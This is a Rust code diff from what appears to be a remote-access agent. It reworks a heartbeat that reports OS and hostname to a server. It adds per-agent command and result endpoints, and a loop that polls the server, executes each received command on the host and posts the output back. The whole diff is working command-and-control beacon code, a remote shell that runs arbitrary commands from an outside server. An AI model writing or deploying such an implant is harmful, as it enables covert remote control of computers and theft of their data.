@@ -85,13 +85,13 @@ fn stdin_ready() -> io::Result<bool> {
 }
 
 async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
-    let url = if !server_addr.starts_with("http://") {
-        format!("http://{}/agent/heartbeat", server_addr)
+    let url = if !server_addr.starts_with("http://") && !server_addr.starts_with("https://") {
+        format!("http://{}/api/agent/{}/heartbeat", server_addr, agent_id)
     } else {
-        format!("{}/agent/heartbeat", server_addr)
+        format!("{}/api/agent/{}/heartbeat", server_addr, agent_id)
     };
     
-    println!("[DEBUG] Sending heartbeat to {}", url);
+    println!("[DEBUG] Sending heartbeat to {} for agent {}", url, agent_id);
     
     let os = os_info::get();
     let hostname = hostname::get()?
@@ -120,16 +120,44 @@ async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
     }
 }
 
-async fn get_command(server_addr: &str) -> io::Result<Option<String>> {
-    match ureq::get(&format!("{}/get_command", server_addr)).call() {
+async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
+    let url = if !server_addr.starts_with("http://") && !server_addr.starts_with("https://") {
+        format!("http://{}/api/agent/{}/command", server_addr, agent_id)
+    } else {
+        format!("{}/api/agent/{}/command", server_addr, agent_id)
+    };
+    
+    match ureq::get(&url).call() {
         Ok(response) => {
-            if response.status() == 200 {
-                Ok(Some(response.into_string()?))
-            } else {
-                Ok(None)
+            if response.status() == 204 {
+                return Ok(None);
             }
+            
+            let command: String = response.into_json()?;
+            Ok(Some(command))
         },
-        Err(e) => Err(io::Error::new(io::ErrorKind::Other, format!("Failed to get command: {}", e))),
+        Err(e) => {
+            println!("[DEBUG] No command available: {}", e);
+            Ok(None)
+        }
+    }
+}
+
+async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
+    let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
+    
+    let data = json!({
+        "command": command,
+        "output": output,
+        "timestamp": chrono::Utc::now().to_rfc3339()
+    });
+
+    match ureq::post(&url)
+        .set("Content-Type", "application/json")
+        .send_json(data)
+    {
+        Ok(_) => Ok(()),
+        Err(e) => Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
     }
 }
 
@@ -137,11 +165,10 @@ async fn get_command(server_addr: &str) -> io::Result<Option<String>> {
 // It can change directories, upload and download files, and display a directory tree.
 // PRECONDITION: The server must be running and accessible at the specified address.
 // POSTCONDITION: The shell will exit when the user types 'exit'.
-pub async fn run_shell(server_addr: &str) -> io::Result<()> {
-    let agent_id = Uuid::new_v4().to_string();
+pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
     println!("[DEBUG] Starting shell with agent ID: {}", agent_id);
 
-    let base_url = if !server_addr.starts_with("http://") {
+    let base_url = if !server_addr.starts_with("http://") && !server_addr.starts_with("https://") {
         format!("http://{}", server_addr)
     } else {
         server_addr.to_string()
@@ -153,43 +180,28 @@ pub async fn run_shell(server_addr: &str) -> io::Result<()> {
         env::set_current_dir(home)?;
     }
 
-    send_heartbeat(&base_url, &agent_id).await?;
+    send_heartbeat(&base_url, agent_id).await?;
     
     loop {
         // Poll for commands
         println!("[DEBUG] Polling for commands...");
-        match ureq::get(&format!("{}/get_command", base_url)).call() {
-            Ok(response) => {
-                if response.status() == 200 {
-                    let command = response.into_string()?;
-                    println!("[DEBUG] Received command: {}", command);
-                    
-                    // Handle command differently based on platform
-                    #[cfg(windows)]
-                    let cmd_parts: Vec<&str> = vec![&command];
-                    
-                    #[cfg(not(windows))]
-                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-                    
-                    // Execute command and get output
-                    match execute_command(&cmd_parts).await {
-                        Ok(output) => {
-                            println!("[DEBUG] Sending command result...");
-                            match ureq::post(&format!("{}/submit_result", base_url))
-                                .set("X-Command", &command)
-                                .send_string(&output)
-                            {
-                                Ok(_) => println!("[DEBUG] Result sent successfully"),
-                                Err(e) => println!("[ERROR] Failed to send result: {}", e)
-                            }
-                        },
-                        Err(e) => println!("[ERROR] Command execution failed: {}", e)
-                    }
-                }
+        match get_command(&base_url, agent_id).await? {
+            Some(command) => {
+                println!("[DEBUG] Received command: {}", command);
+                
+                // Handle command differently based on platform
+                #[cfg(windows)]
+                let cmd_parts: Vec<&str> = vec![&command];
+                
+                #[cfg(not(windows))]
+                let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+                
+                let output = execute_command(&cmd_parts).await?;
+                submit_result(&base_url, agent_id, &command, &output).await?;
             }
-            Err(e) => println!("[ERROR] Failed to poll commands: {}", e)
+            None => {
+                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+            }
         }
-        
-        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
     }
 }
